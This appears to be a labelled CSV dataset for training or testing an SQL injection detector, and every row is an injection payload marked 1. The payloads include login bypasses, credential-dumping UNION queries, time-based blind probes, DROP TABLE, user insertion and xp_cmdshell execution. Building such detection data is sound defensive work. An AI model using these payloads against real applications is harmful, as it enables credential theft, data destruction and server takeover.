Sentence,Label
""" OR ""2""=""213 AND 1=1/*267--",1
"99""; WAITFOR DELAY ""00:00:05""--",1
""" OR 1=1#----# AND 1=1-- AND 1=1876 AND 1=1# OR 1=1",1
' OR '2'='213/*36261,1
"""%20UNION%20ALL%20SELECT%20NULL--108 AND 1=1#",1
' OR '1'='1#1 AND 1=1833,1
1'%20OR%201%20=%201 OR 1=1#,1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1311--598669574",1
"admin' UNION SELECT NULL,NULL,NULL---- AND 1=1982781/*#541",1
"admin' UNION SELECT NULL,NULL,NULL--/*# AND 1=1 AND 1=1",1
'/**/OR/**/'1'='1'/**/--282493,1
user' UNION ALL SELECT NULL--/*/*--/*,1
""" UNION SELECT NULL--/*622/*675",1
"test1"" OR ""1"" = ""1/*# AND 1=1--50353797",1
admin' OR '1'='1' /* AND 1=1452 AND 1=1108,1
"admin"" OR 1=1#/*120--",1
1%27--454117261,1
1' OR 'a'='a544/*6067,1
"admin' UNION SELECT username,password FROM users-- AND 1=1/*413",1
"""%20or%201=1#428187486",1
""")+OR+(""1""=""1-- AND 1=1 AND 1=1522",1
""" OR ""1""=""1"" /*#--845",1
""" OR ""1""=""1 AND 1=1 OR 1=1 OR 1=1736",1
' UNION SELECT NULL--/*622/*-- AND 1=1585,1
""" OR 1=1#-- OR 1=1#805#",1
10x27 AND pg_sleep(5)--# AND 1=1,1
"' union select null,null,null--# AND 1=1--491 OR 1=1510 OR 1=1583",1
"ADMIN""/*17253168544",1
') OR ('1'='1/* OR 1=1----,1
' OR 1=1#----# AND 1=1-- AND 1=1,1
1'----101--/*79951,1
"admin' UNION SELECT NULL,NULL--897514930",1
'/**/OR/**/'1'='1'/**/--282#985428,1
""" OR 1=1#----# AND 1=1-- AND 1=1659",1
"useradmin"" OR 1=1--#572/* OR 1=1",1
1%27%3B%20DROP%20TABLE%20users--204,1
'/**/OR/**/'1'='1'/**/--/*75157 OR 1=1 AND 1=1,1
"99""; INSERT INTO users VALUES(""hacked"",""pass"")-- OR 1=1210784 OR 1=1157176",1
admin' UNION SELECT NULL-- AND 1=1#645/*735 AND 1=1/*/*219,1
admin0x27/*467468 OR 1=1999256 AND 1=1,1
"""/**/OR/**/1=1-- OR 1=1373 AND 1=1#",1
11' OR '1' = '1/*--,1
"""%20or%201=1/*835257/* OR 1=1 AND 1=1431",1
"test1' UNION SELECT NULL,table_name FROM information_schema.tables-- AND 1=157437693",1
' or 2=2/* AND 1=1781,1
"""%09UNION%09ALL%09SELECT%09NULL--477/*-- AND 1=1812#/*/*500450",1
"1"" OR ""a""=""a AND 1=1--376536 OR 1=1",1
""" OR ""1""=""1 AND 1=1104146",1
'%20or%201=1#37,1
"""%20or%201=1# AND 1=1 OR 1=1# AND 1=1--",1
""" OR ""2""=""213/*#942668",1
""" OR 1=1#----# AND 1=1-- AND 1=1876 AND 1=1#631",1
user' OR 'a'='a----#205,1
0x27; DROP TABLE users--15# AND 1=1266,1
2'--#,1
user') OR 1=1-- AND 1=1882350307#--354,1
' UNION SELECT NULL--/*622/*427/*515146#,1
"admin"" OR 1=1--/* OR 1=1--/*84",1
"admin"" OR 1=1--#708 OR 1=1",1
admin' OR 1=1#177840840,1
"user"" OR 1=1/* AND 1=1--/* AND 1=1",1
""" UNION SELECT USERNAME,PASSWORD FROM USERS--/*--",1
'/**/OR/**/1=1-- OR 1=1 AND 1=1 OR 1=1 OR 1=1423 OR 1=1,1
"user1' UNION SELECT NULL,table_name FROM information_schema.tables---- AND 1=1",1
admin' OR 1=1-- AND 1=1929,1
"admin' UNION SELECT 1,2,3--#343853",1
"admin"" UNION SELECT NULL,NULL,NULL--/*517 AND 1=1594749",1
"1';+INSERT+INTO+users+VALUES('hacked','pass')-- AND 1=1 OR 1=134961",1
"useradmin"" OR ""1""=""1-- OR 1=1600903",1
"admin""/**/OR/**/1=1-- OR 1=1 OR 1=1#",1
' UNION SELECT NULL--/*622/*42723926/*,1
ADMIN'/*172620849#,1
1'------910,1
user') OR ('1'='1 AND 1=1 AND 1=1191,1
"'/**/AND/**/extractvalue(1,concat(0x7e,version()))--761--/*316958",1
'+OR+'1'='1--959--,1
"'%09AND%09extractvalue(1,concat(0x7e,version()))--",1
"admin1"" OR ""1"" = ""1# AND 1=1#114",1
%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--# AND 1=1--246371,1
""";+EXEC+xp_cmdshell(""dir"")-- AND 1=1--247810561677",1
') OR ('2'='2 OR 1=1290 OR 1=1505635,1
admin' OR 1=1-- OR 1=1#434,1
testadmin' OR '1'='1/*#,1
1' OR '1' = '1 AND 1=1566 OR 1=1 OR 1=1#--,1
"'%20UNION%20SELECT%20NULL,NULL,NULL----#712 OR 1=1",1
1' OR '1'='1' --#412640809,1
"useradmin"" OR 1=1--#/*606171457",1
"' UNION SELECT 1,2,3--",1
admin0x27/*46746874,1
testadmin' OR '1'='1 AND 1=1 OR 1=1 OR 1=1/* AND 1=1/*--260,1
' OR '2'='2/*785304,1
"""%09UNION%09ALL%09SELECT%09NULL--477/*-- AND 1=1812371210",1
"admin' UNION SELECT NULL,NULL--#/*",1
"""/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--138344912404 OR 1=1",1
'%09UNION%09ALL%09SELECT%09NULL----,1
useradmin' OR 1=1--#/*/*,1
' or 2=2/* AND 1=1428,1
"1'%20UNION%20SELECT%20NULL,table_name%20FROM%20information_schema.tables-- OR 1=1109",1
""" OR ""2""=""213 AND 1=1/*668",1
""";+EXEC+xp_cmdshell(""dir"")-- AND 1=1--247810561#742",1
aDMin'/*778862,1
"test"" OR ""1""=""1/* OR 1=1488",1
'%09AND%091=CAST((SELECT%09@@version)%09AS%09int)--,1
"1' UNION SELECT NULL,table_name FROM information_schema.tables-- AND 1=1 OR 1=1#152--",1
0x27) OR 1=1--# AND 1=1--750,1
'+OR+'1'='1--959 OR 1=1,1
' or 2=2/* AND 1=1#,1
admin' UNION ALL SELECT NULL----# AND 1=1691628,1
user' OR 'a'='a----403,1
"1'%20UNION%20SELECT%20NULL,table_name%20FROM%20information_schema.tables-- OR 1=1--705",1
"admin"" UNION SELECT NULL,NULL--897514154 OR 1=1##",1
admin' UNION ALL SELECT NULL-- AND 1=1-- OR 1=1165,1
test' OR '1'='1-- OR 1=1733922220,1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1311# OR 1=1#927 AND 1=1851989",1
'+OR+1=1#/*# AND 1=1/* AND 1=1962,1
test' OR 1=1##/*#600841530,1
' OR '2'='213973 AND 1=1--53 AND 1=1635 OR 1=1,1
"test"" UNION SELECT username,password FROM users-- AND 1=136471",1
""" OR 99=99## AND 1=1",1
admin1' OR '1' = '1# AND 1=1404,1
10x27; WAITFOR DELAY 0x2700:00:050x27----928 AND 1=1 OR 1=1406404 OR 1=1172,1
"99'; INSERT INTO users VALUES('hacked','pass')--372816#392432",1
"admin""/**/OR/**/1=1-- OR 1=1 OR 1=1756/*677",1
"""%09or%091=1# AND 1=1 OR 1=1691449746",1
"""+UNION+SELECT+NULL--608 OR 1=1",1
"""%20or%201=1#428/* OR 1=1438",1
"admin"") OR (""1""=""1# OR 1=1657",1
"99'; INSERT INTO users VALUES('hacked','pass')-- OR 1=121078442514",1
aDMin'/* OR 1=1/*371,1
10x27; WAITFOR DELAY 0x2700:00:050x27----464,1
';%20EXEC%20xp_cmdshell('dir')--# AND 1=1--,1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns-- OR 1=1 OR 1=138",1
"""/**/OR/**/1=1-- OR 1=1/*857470924140271",1
"99"" AND BENCHMARK(5000000,MD5(""A""))-- OR 1=1878###",1
"""%20or%201=1# AND 1=1 OR 1=1447918",1
'%20or%201=1/*8352573838315989,1
"99"" AND BENCHMARK(5000000,MD5(""A""))-- OR 1=1112",1
1' OR '1'='1' --#57/*146/*,1
' OR 'a'='a AND 1=1,1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns--/* OR 1=1## OR 1=1679664 OR 1=1",1
"'/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--# AND 1=1#--",1
"1'; INSERT INTO users VALUES('hacked','pass')--739 AND 1=1567367",1
""" OR 99=99##122",1
test' OR '1'='1' /*#632874,1
user') OR 1=1-- AND 1=1882350307 OR 1=1,1
' OR 'a'='a839603,1
"' union select null,null,null--# AND 1=1--491 OR 1=1987",1
user' OR 1=1--/* OR 1=1,1
' OR '2'='213/*10140 OR 1=1,1
test' OR '1'='1' /*#/*--915,1
"test1' UNION SELECT NULL,table_name FROM information_schema.tables---- AND 1=1882",1
'/**/OR/**/'1'='1'/**/--869,1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns--#/*",1
"1""%09AND%09pg_sleep(5)--860 OR 1=125816#",1
' AND 2=CAST((SELECT @@version) AS int)--#373 OR 1=1/*,1
' OR '2'='213/*#942788,1
useradmin' OR 1=1--#/*606607,1
""") OR (""1""=""1/* OR 1=1716",1
"admin"" UNION ALL SELECT NULL--24127#308",1
"1';/**/INSERT/**/INTO/**/users/**/VALUES('hacked','pass')--344",1
admin1' OR '1' = '1--/*60386608 AND 1=1,1
' OR '2'='2 AND 1=1 AND 1=1--173--380,1
"99""; INSERT INTO users VALUES(""hacked"",""pass"")-- OR 1=1210784 OR 1=1 OR 1=1",1
"1""/**/AND/**/SLEEP(5)--",1
"user"") OR (""1""=""1/*",1
99'; WAITFOR DELAY '00:00:05'-- OR 1=1,1
"1'; INSERT INTO users VALUES('hacked','pass')-- OR 1=1 AND 1=1 OR 1=1 AND 1=1348301",1
""" OR ""1""=""1"" /*##256--",1
"1'%20UNION%20SELECT%20NULL,table_name%20FROM%20information_schema.tables--408298/*",1
"user"" OR 1=1/* AND 1=1--/*--",1
0x27 UNION ALL SELECT NULL--415--,1
test' OR '1'='1-- OR 1=1/*,1
') OR ('1'='1/* OR 1=1--/*248642760,1
useradmin' OR 1=1--#/*606171139,1
"user"") OR 1=1-- AND 1=1325 AND 1=167#643",1
1'; WAITFOR DELAY '00:00:010'--866/*910,1
' AND 2=CAST((SELECT @@version) AS int)--# AND 1=1/*591,1
'/**/OR/**/1=1-- OR 1=1876--/*205,1
'%20or%201=1#667--797/*,1
"1"" OR ""1""=""1/* AND 1=1 OR 1=1/* OR 1=1659#",1
"admin1' UNION SELECT NULL,table_name FROM information_schema.tables--#",1
"1"" UNION SELECT NULL,NULL,NULL--14992156",1
"1"" UNION SELECT NULL,NULL------611--213398 OR 1=1",1
"admin"" UNION SELECT NULL,NULL,NULL--/*517 AND 1=1594 OR 1=1112804",1
"""/**/OR/**/1=1-- OR 1=1/*857470924140 AND 1=1",1
')/**/OR/**/1=1----,1
"1"" OR ""1""=""1/* AND 1=1 OR 1=1/* OR 1=1497352979",1
1%27%20OR%201%20%3D%201936,1
admin' OR 'a'='a OR 1=1574,1
admin1' OR '1' = '1--/*603#937149995#,1
"admin' UNION SELECT NULL,NULL,NULL---- AND 1=19825636913",1
admin'/**/OR/**/1=1-- OR 1=1 OR 1=1756710 OR 1=1--#,1
"99""; INSERT INTO users VALUES(""hacked"",""pass"")-- OR 1=1210784 OR 1=1/*/* OR 1=1/*",1
"""/**/OR/**/1=1-- OR 1=1/*857/*",1
1'; WAITFOR DELAY '00:00:010'--866/*--,1
';%09EXEC%09xp_cmdshell('dir')---- AND 1=1887865,1
')%20OR%201=1--/*,1
"""+UNION+SELECT+NULL--608168312",1
""" AND extractvalue(1,concat(0x7e,version()))--161/*788318#",1
"99""; INSERT INTO users VALUES(""hacked"",""pass"")-- OR 1=1210784 OR 1=1/*/*862",1
"1""+OR+1+=+1351 OR 1=1968",1
useradmin' OR 1=1--#/*606/*,1
1admin' OR '1'='1/*/*33,1
' UNION SELECT NULL--/*622/*427/*25640440 AND 1=1,1
test' UNION SELECT NULL----#779 AND 1=1,1
"' union select null,null,null--# AND 1=1--491457",1
"1"" UNION SELECT NULL,NULL------611--306493#223",1
""" or 2=2/* AND 1=1#674",1
'/**/OR/**/'1'='1'/**/-- OR 1=1575518890,1
test') OR ('1'='1##,1
admin'/**/OR/**/1=1-- OR 1=1402283#,1
"user"") OR 1=1-- AND 1=1325 AND 1=167# AND 1=1942",1
"99""; INSERT INTO users VALUES(""hacked"",""pass"")-- OR 1=1-- OR 1=1# AND 1=1",1
1' OR 'a'='a544#--928,1
'/**/OR/**/1=1-- OR 1=1876-- AND 1=1455,1
' AND 1=CAST((SELECT @@version) AS int)--/*931,1
"admin"") OR 1=1----/*460",1
"admin"" UNION ALL SELECT NULL----525#",1
"admin1"" OR ""1"" = ""1# AND 1=1#785489383#429",1
useradmin' OR 1=1----25,1
1' OR '1'='1' --#57 OR 1=1#332/*,1
' OR 1=1#---- AND 1=1,1
"1""; INSERT INTO users VALUES(""hacked"",""pass"")--739####423",1
1') OR 1=1----# AND 1=1/*,1
ADMIN'/*--672109,1
"""%09UNION%09SELECT%09NULL,NULL-- OR 1=1179",1
"testadmin"" OR ""1""=""1#624",1
"""/**/AND/**/extractvalue(1,concat(0x7e,version()))---- AND 1=1302909",1
99' OR 99 = 99 OR 1=1#872331--111,1
"""%20or%201=1##--",1
"admin' UNION SELECT username,password FROM users-- AND 1=1 OR 1=1 AND 1=160827----",1
1' OR '1' = '1 AND 1=1 AND 1=1/*993960336,1
' OR 'a'='a839145,1
1'%09AND%09pg_sleep(5)--860 OR 1=1 OR 1=1,1
user') OR 1=1-- AND 1=1882350307925/*#,1
"admin""/**/OR/**/1=1-- OR 1=1 OR 1=1756/*389",1
1' OR 1=1/*# OR 1=1/*506,1
""";%09EXEC%09xp_cmdshell(""dir"")-- AND 1=1",1
ADMIN'/* AND 1=1--#172,1
'%09OR%091=1--754,1
"testadmin"" OR 1=1-- AND 1=1126868620",1
user') OR 1=1-- AND 1=1882350307925/* OR 1=1,1
"user"" OR ""1""=""1#-- OR 1=1 OR 1=1970773",1
""";+SELECT+SLEEP(5)--",1
"admin1"" OR ""1"" = ""1--/*737# OR 1=1",1
"admin"" UNION SELECT NULL,NULL,NULL--/*517 AND 1=161",1
""" OR 1=1#----##82559",1
"test' UNION SELECT 1,2,3--/*#974 OR 1=1--",1
1%27%20OR%20%271%27%20%3D%20%271/* AND 1=1,1
"1""%09AND%09pg_sleep(5)--860 OR 1=1258190",1
"1' UNION SELECT username,password FROM users--652576863",1
"admin"" OR ""99""=""99 OR 1=1809 OR 1=1",1
testadmin' OR '1'='1 AND 1=1613186499#936,1
"admin1"" OR ""1"" = ""1# OR 1=1/*20",1
1' OR 'a'='a544#80 AND 1=1/*,1
"admin"") OR (""1""=""1# OR 1=16014866#",1
"admin"" UNION SELECT NULL-- AND 1=1--",1
"test' UNION SELECT 1,2,3-- AND 1=1512 AND 1=1309718539",1
"1"" UNION SELECT NULL,NULL------611-- OR 1=1--377 OR 1=1989106673546905",1
1' OR '1'='1' --#57 OR 1=1# OR 1=1,1
admin1' OR '1' = '1--/*603#93727295#,1
"' union select null,null,null--# AND 1=1-- AND 1=1981",1
'/**/OR/**/'1'='1'/**/--/*75#343,1
admin' OR '1'='1' /* AND 1=1452#249,1
test' OR '1'='1 AND 1=1--930,1
admin1' OR '1' = '1--/*603#937272698,1
%2527%2520or%25201%253D1/%252A52393,1
'+OR+1=1#/*# AND 1=1/*#/*/* OR 1=1884,1
user') OR ('1'='1--167387572818,1
admin' OR 1=1#177633531,1
"1"" UNION SELECT NULL,NULL------611-- OR 1=1696272",1
' OR 1=1#----257,1
"useradmin"" OR 1=1--#572 OR 1=1138",1
' AND 2=CAST((SELECT @@version) AS int)--881963 OR 1=1/*235,1
2' OR '2' = '2163254577,1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1311--598669972",1
"admin' UNION SELECT NULL,NULL--897514#739",1
'+OR+1=1#/*160837,1
""" union select null,null,null--# AND 1=1--682 OR 1=1",1
';+EXEC+xp_cmdshell('dir')-- AND 1=1--247 AND 1=1--,1
2' AND SLEEP(5)--761163 OR 1=1,1
admin' OR 1=1-- OR 1=1#27,1
"""+OR+""1""=""1--7206",1
' UNION SELECT NULL--/*622/*427/*51514672,1
user' OR '1'='1#315-- AND 1=1463,1
'%20or%201=1# AND 1=1 AND 1=1 OR 1=1429 AND 1=1,1
1'%20OR%201%20=%201 AND 1=1,1
"' AND 1=CONVERT(int,(SELECT @@version))-- AND 1=1953--# OR 1=1740#",1
"1"" OR ""a""=""a AND 1=1--376--546--",1
"admin' UNION SELECT NULL,NULL-- AND 1=1350#",1
"test"" OR ""1""=""1"" /*#/*654744",1
"admin"" UNION SELECT 1,2,3-- AND 1=1 OR 1=1514",1
' or 2=2/*367802,1
"user"" UNION SELECT NULL--/*58370 AND 1=1 AND 1=1654",1
"""%09UNION%09ALL%09SELECT%09NULL--477/*--/*",1
"admin"" OR 1=1--/* OR 1=1--930",1
1' OR '1'='1 OR 1=1257--570342,1
"99'; INSERT INTO users VALUES('hacked','pass')-- OR 1=1210784 OR 1=1974207",1
""")+OR+(""1""=""1 AND 1=1875# AND 1=1",1
"'/**/AND/**/extractvalue(1,concat(0x7e,version()))--761--/*##794137",1
"1""%20UNION%20SELECT%20NULL,table_name%20FROM%20information_schema.tables-- OR 1=1--/* OR 1=1106",1
1' OR '1' = '1 AND 1=1 AND 1=1/*702 OR 1=1,1
"user"" UNION SELECT NULL,NULL,NULL--",1
"""+OR+1=1#/*# AND 1=1/*#/*/* OR 1=1 OR 1=1##",1
1' OR '1' = '1 AND 1=1 AND 1=1/*993 AND 1=1,1
admin'/**/OR/**/1=1-- OR 1=1402--,1
"admin"" OR ""99""=""99 OR 1=1809 AND 1=1 OR 1=1224 OR 1=1",1
"1' UNION SELECT 1,2,3-- AND 1=1952 AND 1=1136/*943",1
"' AND 1=CONVERT(int,(SELECT @@version))-- AND 1=1953--#423208",1
"useradmin"" OR ""1""=""1-- OR 1=1125737238",1
'/**/or/**/1=1/*135--#154,1
"1""%09UNION%09SELECT%09NULL,column_name%09FROM%09information_schema.columns--# AND 1=1",1
"""/**/or/**/1=1/*135540 OR 1=1219",1
"1""+UNION+SELECT+NULL,table_name+FROM+information_schema.tables-- AND 1=1 AND 1=1# AND 1=1",1
user') OR 1=1-- AND 1=1882350307#754,1
'%20or%201=1--969 OR 1=1/*215 OR 1=1786119,1
'%20or%201=1/*83525738383479,1
test1' OR 1 = 1/*,1
"""%20or%201=1/*696529",1
admin') OR 1=1--876233,1
user' OR '1'='1#315-- AND 1=1/*619342,1
"test' UNION SELECT 1,2,3-- OR 1=1",1
admin' OR 2=2--925348 OR 1=1#,1
"admin' UNION SELECT NULL,NULL,NULL--/*# AND 1=1665 OR 1=1",1
admin%27%20OR%20%271%27%3D%27120 AND 1=1#-- OR 1=1,1
user' OR '1'='1#315-- AND 1=1 OR 1=161,1
%2527%2520or%25201%253D1/%252A794,1
"testadmin"" OR ""1""=""1 AND 1=1613----#368",1
"'%20UNION%20SELECT%20NULL,NULL,NULL---- OR 1=1 AND 1=1",1
1' OR '1' = '1 AND 1=1 AND 1=1/*/*,1
"'/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--138/*-- AND 1=1445 AND 1=1",1
"1""+OR+1+=+1351888387 OR 1=1#",1
""" UNION SELECT USERNAME,PASSWORD FROM USERS--/*#",1
' OR '1'='1' /*#491,1
%27%29%20OR%20%28%271%27%3D%271 AND 1=1956 OR 1=1--,1
"99'; INSERT INTO users VALUES('hacked','pass')-- OR 1=1210784 OR 1=1717141",1
1' UNION SELECT NULL----159171,1
'%20or%201=1/*835257383# OR 1=1,1
admin' OR '99'='99 OR 1=1760,1
"99"" AND BENCHMARK(5000000,MD5(""A""))-- OR 1=1332",1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1189/*",1
1' OR '1'='1' --/*612 AND 1=1 OR 1=1,1
""" or 1=1--/*",1
"' AND 1=CONVERT(int,(SELECT @@version))-- AND 1=1502813",1
"admin' UNION SELECT NULL,NULL--#122/*",1
1'%09AND%09pg_sleep(5)--860513 OR 1=1781,1
"' union select null,null,null--# AND 1=1--491 OR 1=1510 OR 1=1--",1
"'%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1131249595",1
"""/**/AND/**/extractvalue(1,concat(0x7e,version()))--761--/*743",1
0x27 UNION ALL SELECT NULL--415482/*950,1
10x27; WAITFOR DELAY 0x2700:00:050x27----928753344,1
"1"" OR ""a""=""a AND 1=1--376--546398--",1
' OR 1=1/*--,1
') OR ('1'='1/* OR 1=1293633,1
0x27; DROP TABLE users--15261956,1
"user"") OR (""1""=""1 OR 1=1 AND 1=1430#",1
"'/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--138/*--713",1
"user"" UNION SELECT 1,2,3-- AND 1=1749927",1
') OR ('1'='1/* OR 1=1/* OR 1=1 OR 1=1982,1
"1"" UNION SELECT NULL----395/* AND 1=1228931878",1
1' OR '1'='1 OR 1=1257--282,1
user' UNION SELECT NULL--/*#84,1
"""/**/OR/**/1=1-- OR 1=1/*857470887",1
"admin"" UNION SELECT NULL,NULL,NULL--/*517 AND 1=1594 OR 1=1 AND 1=1",1
1'%20AND%20pg_sleep(5)--63651772,1
1' OR '1'='1' --#57 OR 1=1704 AND 1=1,1
2' AND SLEEP(5)---- AND 1=1,1
'%09or%091=1# AND 1=1 OR 1=1 AND 1=1116 OR 1=1,1
user' OR 1=1--/* OR 1=1## OR 1=1/*,1
99' OR 99 = 99 OR 1=1#872605,1
"admin""/**/OR/**/1=1-- OR 1=1 OR 1=1756 OR 1=1",1
"admin' UNION SELECT NULL,NULL,NULL--/*# AND 1=166556590/*",1
"admin' UNION SELECT username,password FROM users-- AND 1=1 OR 1=1 AND 1=160827/*",1
"test' UNION SELECT 1,2,3--/*#974 OR 1=1#845#",1
%27%20or%201%3D1%23248,1
"admin1"" OR ""1"" = ""1--/*737513",1
"admin1"" OR ""1"" = ""1# OR 1=1/*67721470395",1
';%20EXEC%20xp_cmdshell('dir')--# AND 1=1202/* OR 1=1524,1
10x27; WAITFOR DELAY 0x2700:00:050x27-- AND 1=1 AND 1=1435854 OR 1=1,1
"1"" OR ""1"" = ""1-- OR 1=1#537",1
""")+OR+(""1""=""1 AND 1=1875237",1
"user"" UNION SELECT NULL,NULL--/* OR 1=1428698",1
"' UNION SELECT NULL,NULL,NULL--/*/* OR 1=1/*",1
admin%27%20OR%20%271%27%3D%27120 AND 1=140 AND 1=1 AND 1=1 OR 1=1 OR 1=1956,1
"test' UNION SELECT 1,2,3-- AND 1=1512 AND 1=197 OR 1=1",1
admin' OR 1=1/*## OR 1=1349697710,1
"user"" UNION SELECT NULL,NULL,NULL--805",1
admin'/*451446794869,1
1' OR '1' = '1 AND 1=1566173,1
"admin"" UNION SELECT 1,2,3-- AND 1=1 OR 1=1-- AND 1=1",1
'/**/OR/**/1=1-- OR 1=1 OR 1=1165528,1
user' UNION SELECT NULL---- AND 1=1#,1
"' AND updatexml(2,concat(0x7e,version()),2)--/*",1
"""%20or%201=1/*/*",1
') OR ('1'='1/* OR 1=1--/*885240,1
"test"" OR ""1""=""1"" /*#/*654347",1
1' OR '1'='1' --#57#----,1
10x27; WAITFOR DELAY 0x2700:00:050x27----928 AND 1=1 OR 1=1406404851,1
admin' OR '99'='99 OR 1=1636,1
"1'%20UNION%20SELECT%20NULL,table_name%20FROM%20information_schema.tables--408 OR 1=1",1
"1'%09UNION%09SELECT%09NULL,column_name%09FROM%09information_schema.columns--# AND 1=1 AND 1=1 AND 1=1",1
2' AND SLEEP(5)--33,1
' UNION SELECT NULL--/*622/*427/*515934,1
ADMIN'/* AND 1=1--784 AND 1=1,1
0x27 OR 1=1--,1
"1"" UNION SELECT NULL,NULL--# OR 1=1599 AND 1=1",1
"' AND extractvalue(99,concat(0x7e,version()))-- OR 1=114",1
test' OR 1=1#/*# AND 1=1171,1
10x27; WAITFOR DELAY 0x2700:00:050x27-- AND 1=1 AND 1=1435610,1
""" OR ""2""=""213 AND 1=1/*26727/*",1
user') OR 1=1-- AND 1=1,1
' AND 1=CAST((SELECT @@version) AS int)--20,1
' OR '1'='1' /*#--766,1
"1""/**/AND/**/SLEEP(5)--336",1
1' OR '1' = '1 AND 1=1 AND 1=1 OR 1=1,1
' or 2=2----#,1
'+OR+'1'='1-- AND 1=1 AND 1=1577,1
"""%09UNION%09ALL%09SELECT%09NULL--477/*-- AND 1=1812 AND 1=1853657665",1
'%20or%201=1--969 OR 1=1 AND 1=1 OR 1=1,1
';%09EXEC%09xp_cmdshell('dir')----#-- OR 1=1,1
0x27; DROP TABLE users--15 OR 1=1,1
"test"" OR 1=1##933102/*753 AND 1=1512",1
"99'; INSERT INTO users VALUES('hacked','pass')--37281667561652",1
"1'; INSERT INTO users VALUES('hacked','pass')---- OR 1=1739",1
""" OR ""2""=""213/*584164#",1
1' OR '1'='1' --/*612 AND 1=1#/*638,1
';+EXEC+xp_cmdshell('dir')-- AND 1=1--247 AND 1=1850,1
admin' UNION ALL SELECT NULL--24127#133,1
%2527%2520UNION%2520SELECT%25201%252C2%252C3--614894,1
""" UNION ALL SELECT NULL--/* AND 1=16",1
admin') OR 1=1--876--,1
' OR '1'='1#474953635,1
'+OR+1=1#/*#--982,1
'+OR+1=1#/*# AND 1=1/*#/*/* OR 1=1579,1
1' OR '1'='1' --/*612 AND 1=1#725 OR 1=1,1
"test"" UNION SELECT username,password FROM users-- AND 1=1364/*",1
"""/**/OR/**/1=1-- OR 1=1 OR 1=1165",1
"admin"") OR (""1""=""1# OR 1=1/*/*/*",1
"""/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--138",1
test' OR 1=1##933102#,1
"' union select null,null,null--###",1
2' AND SLEEP(5)--#669182,1
2' AND SLEEP(5)--735,1
"useradmin"" OR ""1""=""1-- OR 1=1125673",1
"admin"") OR (""1""=""1# OR 1=1/*/* AND 1=1",1
1' OR '1'='1 OR 1=1 AND 1=1827,1
'+OR+1=1#/*# AND 1=1/*636,1
%2527%2520OR%25201%253D1/%252A53987,1
11' OR '1' = '1/* OR 1=1117826,1
%2527%2520OR%2520%25271%2527%253D%25271%2527%2520--,1
"""%20or%201=1#428/* OR 1=1 AND 1=1 AND 1=1",1
""" OR ""a""=""a",1
"1"" OR ""1"" = ""1--365188/*",1
1'----101--/*709,1
admin' UNION ALL SELECT NULL--24127474161545,1
"admin1"" OR ""1"" = ""1# AND 1=1##",1
user') OR 1=1-- AND 1=188235030750383,1
admin%27%20OR%20%271%27%3D%27120 AND 1=140868/* AND 1=1604,1
""" AND extractvalue(1,concat(0x7e,version()))-- OR 1=1278583236 OR 1=1776",1
user') OR 1=1-- AND 1=1882350307925150,1
""" AND extractvalue(1,concat(0x7e,version()))-- OR 1=1278583/*",1
'; WAITFOR DELAY '0:0:5'--/*,1
"'%20UNION%20SELECT%20NULL,NULL,NULL----322",1
'/**/OR/**/'1'='1'/**/--/*75246,1
"admin' UNION SELECT NULL,NULL-- AND 1=1350",1
"test"") OR 1=1--/* OR 1=1449",1
"user"") OR (""1""=""1 AND 1=1990",1
admin') OR 1=1----774#304597 OR 1=1,1
"""%20or%201=1-- OR 1=1--38",1
'; UPDATE USERS SET PASSWORD='HACKED'--69164 AND 1=1434,1
"1"" OR ""1""=""1/* AND 1=1 OR 1=1/* OR 1=1659/*",1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1189 OR 1=1883288",1
"99'; INSERT INTO users VALUES('hacked','pass')-- OR 1=1210958236--217--",1
test') OR ('1'='1--,1
1' OR 'a'='a544/*606 OR 1=1,1
user') OR 1=1-- AND 1=1325 AND 1=167817 AND 1=1,1
';%09EXEC%09xp_cmdshell('dir')----,1
ADMIN'/*826/*513,1
"""%20or%201=1#428187691141694",1
'/**/or/**/1=1/*135--450,1
